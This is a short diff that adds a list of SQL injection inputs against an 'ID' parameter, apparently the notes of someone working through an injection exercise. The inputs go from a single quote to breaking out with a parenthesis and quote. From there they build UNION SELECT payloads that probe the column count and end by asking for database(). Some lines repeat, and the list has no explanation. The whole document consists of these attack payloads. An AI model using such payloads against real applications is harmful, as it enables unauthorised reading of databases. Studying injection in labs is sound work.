@@ -1,0 +1,18 @@
+ID:1'
+ID:1' union 1
+ID:1' union 1
+ID:1' union select 1,2,3 '1
+ID:1') union select 1,2,3 '1
+ID:1') union select 1,2,3 AND'1
+ID:1') union select 1,2,3 &&'1
+ID:1') union select 1,2,3 &&'1==1
+ID:1') union select 1,2,3 &&('1==1
+ID:1') union select 1,2,3 && ('1==1
+ID:1') union select 1,2,3 
+ID:1') union select 1,2,3 || ('1==1
+ID:1') union select 1,2,('3
+ID:1') union select 1,2,('3
+ID:1') union select 1,2,('3
+ID:-1') union select 1,2,('3
+ID:0') union select 1,2,('3
+ID:0') union select 1,2,('database()
